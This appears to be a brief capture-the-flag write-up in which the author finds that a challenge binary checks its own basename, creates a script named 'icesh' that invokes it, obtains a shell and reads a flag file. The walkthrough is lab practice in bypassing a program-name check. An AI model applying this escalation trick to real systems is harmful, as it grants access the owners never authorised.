# Demo

So I didn't know what was the basename fct and didn't want to spend a lot of time reading the doc.

I updated the original script to print what basename would return.
```
  mkdir /tmp/bi
  cd /tmp/bi
  cp /home/demo/demo.c /tmp/bi
  vi /tmp/bi/demo.c
```

I added printf of basename and it printed:

```
$ /tmp/bi/demo
  demo
```

So I realized we just had to match the basename to icesh, I created a bash script:

```
  vi /tmp/bi/icesh

  #/bin/sh
  /home/demo/demo
```

Then ran it and got the shell

```
  ./tmp/bi/icesh
  cat /home/demo/flag.txt
```

